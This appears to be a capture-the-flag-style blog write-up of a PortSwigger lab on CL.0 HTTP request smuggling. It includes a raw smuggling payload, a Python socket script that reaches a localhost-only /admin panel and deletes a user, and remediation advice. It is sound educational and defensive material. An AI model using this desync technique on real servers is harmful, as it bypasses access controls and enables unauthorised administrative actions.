---
layout: post
title: "PortSwigger: CL.0 Request Smuggling"
date: 2027-09-06 09:00:00 -0500
categories: [PortSwigger, WebSecurityAcademy, RequestSmuggling]
tags: [portswigger, http-request-smuggling, cl-0, desync, content-length, browser-powered, cwe-444]
---

Most request-smuggling labs pit `Content-Length` against `Transfer-Encoding`. **CL.0** is simpler and, once you see it, a little alarming: there is no `Transfer-Encoding` at all. The back-end just *ignores* the `Content-Length` header on some endpoints and pretends the body is empty. Everything you put in that body becomes the next request.

## Overview

- **Vuln class:** HTTP request smuggling (CL.0, browser-powered desync)
- **CWE:** [CWE-444 — Inconsistent Interpretation of HTTP Requests](https://cwe.mitre.org/data/definitions/444.html)
- **Goal:** reach the localhost-only `/admin` panel through the desync and delete the user `carlos`.

## The disagreement

A front-end proxy and a back-end server have to agree on where one HTTP request ends and the next begins. In **CL.0**:

- **Front-end → honours `Content-Length`.** It reads the byte count, forwards the whole POST body, done.
- **Back-end → ignores `Content-Length` on `/resources/*`.** For static asset endpoints it treats the body length as **0** and considers the request finished at the blank line after the headers.

So the body bytes the front-end faithfully forwarded are never consumed by the back-end. They sit on the pooled keep-alive connection and become the **start of the next request**. We just have to make those bytes *be* a request we want — like one to `/admin`.

## The exploit

Send a POST to a `Content-Length`-ignoring static endpoint, with a complete second request hidden in the body:

```http
POST /resources/images/blog.svg HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 67

GET /admin/delete?username=carlos HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Foo: x

```

`Content-Length` is the exact byte length of the smuggled block. The front-end forwards all of it; the back-end answers the `blog.svg` POST (a 200 image), then parses the leftover `GET /admin/delete...` as the next request — served with back-end/internal trust, where the front-end's `/admin` access control never runs.

## Confirming it live

You confirm CL.0 with a harmless 404 probe before touching `/admin`. Smuggle `GET /hopefully404` and watch the **second** response on the connection:

```
response 1: HTTP/1.1 200 OK            (the blog.svg image)
response 2: HTTP/1.1 404 Not Found     <-  Not Found: /hopefully404
```

That 404 is the proof: the back-end ignored `Content-Length` and parsed our smuggled prefix. A minimal raw-socket sender (Burp's "Send group in sequence (single connection)" does the same thing):

```python
import socket, ssl

HOST = "YOUR-LAB-ID.web-security-academy.net"
smuggled = (f"GET /admin/delete?username=carlos HTTP/1.1\r\n"
            f"Host: {HOST}\r\nFoo: x\r\n\r\n").encode()

req1 = (f"POST /resources/images/blog.svg HTTP/1.1\r\n"
        f"Host: {HOST}\r\n"
        f"Connection: keep-alive\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(smuggled)}\r\n\r\n").encode() + smuggled

req2 = (f"GET /404check HTTP/1.1\r\n"
        f"Host: {HOST}\r\nConnection: close\r\n\r\n").encode()

s = ssl.create_default_context().wrap_socket(
        socket.create_connection((HOST, 443)), server_hostname=HOST)
s.sendall(req1 + req2)          # <-- one packet, back-to-back. This is the trick.
print(s.recv(65535).decode("latin1", "replace"))
```

Run it once with `GET /admin` smuggled to read the Users panel and confirm the delete link, then with `GET /admin/delete?username=carlos` to solve.

## The gotcha that costs you an hour

**Send the poisoning POST and the follow-up GET back-to-back, in one packet, on one socket** (`s.sendall(req1 + req2)`). My first attempt put a `time.sleep(1)` between the two sends "to be safe" — and the desync silently failed: the follow-up just returned the normal homepage with a 200. The pause lets the front-end finalise the request boundary cleanly, so the leftover body never gets glued to the next request. No error, no hint — just a wrong-looking success. Send them together.

## Why it worked

CL.0 is the same root cause as every desync: **two servers, one byte stream, two different ideas of where the body ends.** Here the back-end's idea is "there is no body" on static endpoints, even when the client clearly declared one. The attacker lives in that gap — whatever the front-end forwarded but the back-end didn't consume becomes the next request, and that request inherits the back-end's internal trust.

## The fix

- The back-end must **not** silently ignore `Content-Length` on any endpoint or method — derive body length consistently and reject ambiguous framing with a 400.
- Make the front-end and back-end agree on one framing mechanism; normalise requests before forwarding.
- Never enforce access control **only** at the front-end. A request that reaches `/admin` by any route must still be authorised.
- Best of all: speak **HTTP/2 end-to-end**, where message length is framed rather than header-declared, and this whole class of bug disappears.
